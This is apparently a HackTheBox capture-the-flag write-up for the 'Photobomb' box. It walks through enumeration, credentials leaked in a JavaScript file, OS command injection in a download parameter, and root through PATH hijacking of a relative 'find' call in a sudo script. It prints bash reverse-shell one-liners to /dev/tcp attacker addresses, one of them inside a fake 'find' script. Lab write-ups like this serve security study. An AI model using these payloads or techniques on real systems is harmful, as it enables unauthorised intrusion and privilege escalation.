---
title: Photobomb
author:
  name: eng4ge
  link: https://github.com/an9k0r
date: 2023-03-04 09:33:00 +0100
categories: [HackTheBox, Linux]
tags: [Web, Vulnerability Assessment, Injection, Custom Applications, NGINX, Python, SUDO Exploitation, OS Command Injection]
math: true
mermaid: true
image:
  src: /assets/images/20221010204442.png
  width: 694
  height: 515
  alt: image alternative text
---
**Photobomb is an easy linux box where we have to enumerate a web application, achieving OS command injection. For privilege escalation, there is vulnerable script which uses relative path which we can exploit**

# Enumeration
## Nmap 

Let's start NMAP
```
Nmap scan report for photobomb.htb (10.129.224.122)
Host is up (0.036s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 e2:24:73:bb:fb:df:5c:b5:20:b6:68:76:74:8a:b5:8d (RSA)
|   256 04:e3:ac:6e:18:4e:1b:7e:ff:ac:4f:e3:9d:d2:1b:ae (ECDSA)
|_  256 20:e0:5d:8c:ba:71:f0:8c:3a:18:19:f2:40:11:d2:9e (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Photobomb
|_http-favicon: Unknown favicon MD5: 622B9ED3F0195B2D1811DF6F278518C2
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Oct 10 19:03:58 2022 -- 1 IP address (1 host up) scanned in 16.42 seconds
```
We have ports `80` and `22`, so we should probably focus on webserver on port 80!

## Web Server
### Whatweb
Using `Whatweb` we get a redirect back to `photobomb.htb` which will be added to `/etc/hosts`
![](/assets/images/20221010190131.png)
We can also see that we're dealing with Ubuntu and we know exact version of `NGINX` server, which is `1.18.0`

### Browser and running Burp in the background
Let's check the website through browser and let's not forget to start Burp to run in the background!

So this is the website:
![](/assets/images/20221010190728.png)

If we click on `click here!` prompt opens asking us for credentials:

![](/assets/images/20221010190815.png)

I'd search for default credentials if i could fingerprint the service but doesn't seem to be the case here. 

### Leaked credentials in JS File
If we've had Burp open, we'd find `photobomb.js` file in `Site Map`

![](/assets/images/20221010191858.png)
Otherwise checking source should do well, as well.

Login using `pH0t0:b0Mb!`

![dsa](/assets/images/20221010192904.png)

### 404 Not found = Sinatra?
If we open non-existing page we get onto this site:
![asd](/assets/images/20221010193045.png)

And the source
![aaa](/assets/images/20221010193220.png)
We can see another port `4567` open on localhost. 
Hopefully we've noticed that some kind of `Sinatra` is running, and if we google => https://sinatrarb.com

### Enumerating download photo 
If we scroll down, we can see that we have some sort of download option

![](/assets/images/20221010194426.png)

This is request seen in Burp
![](/assets/images/20221010194643.png)
After checking for LFI, RFI, i've noticed that `filetype` parameter is vulnerable to OS Command Injection

![](/assets/images/20221010195902.png)
We just need to make sure to inject valid photo, otherwise the payload won't work (at least it did not work for me)

# Getting Shell as Wizard
## OS Command Injection
I've used following payload for reverse shell 
```bash
bash -c  "bash -i >& /dev/tcp/10.10.14.216/4242 0>&1"
```
Before i've sent it i've URL encoded it!

![](/assets/images/20221010200413.png)
# Privilege Escalation to root
## Relative path used - script can be ran as sude
There we are. We now have a shell as `wizard` and `sudo -l` already gives us a hint what should we be looking for. There's a script runing with root privileges named `/opt/cleanup.sh`.
```
wizard@photobomb:~$ cat /opt/cleanup.sh
cat /opt/cleanup.sh
#!/bin/bash
. /opt/.bashrc
cd /home/wizard/photobomb

# clean up log files
if [ -s log/photobomb.log ] && ! [ -L log/photobomb.log ]
then
  /bin/cat log/photobomb.log > log/photobomb.log.old
  /usr/bin/truncate -s0 log/photobomb.log
fi

# protect the priceless originals
find source_images -type f -name '*.jpg' -exec chown root:root {} \;
```
Notice that we the last `find` does not have absolute path specified as commands before that.

We can exploit that simply by modifing our PATH by placing `find` script before real `find`.
Let us do that:
```
wizard@photobomb:~$ whereis find
whereis find
find: /usr/bin/find /usr/share/man/man1/find.1.gz /usr/share/info/find.info-2.gz /usr/share/info/find.info-1.gz /usr/share/info/find.info.gz

wizard@photobomb:~$ echo $PATH
echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

wizard@photobomb:~$ export PATH=/home/wizard:$PATH
export PATH=/home/wizard:$PATH

wizard@photobomb:~$ echo $PATH
echo $PATH
/home/wizard:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

```
echo '#!/bin/bash' > find
echo '/bin/bash -c "/bin/bash -i >& /dev/tcp/10.10.14.216/5555 0>&1" &' >> find
```

Make sure to make thae `/home/wizard/find` script executable using `chmod +x find`!

When runing the `/opt/cleanup.sh` you'll have to include the ENV variable = PATH.

![](/assets/images/20221010204244.png)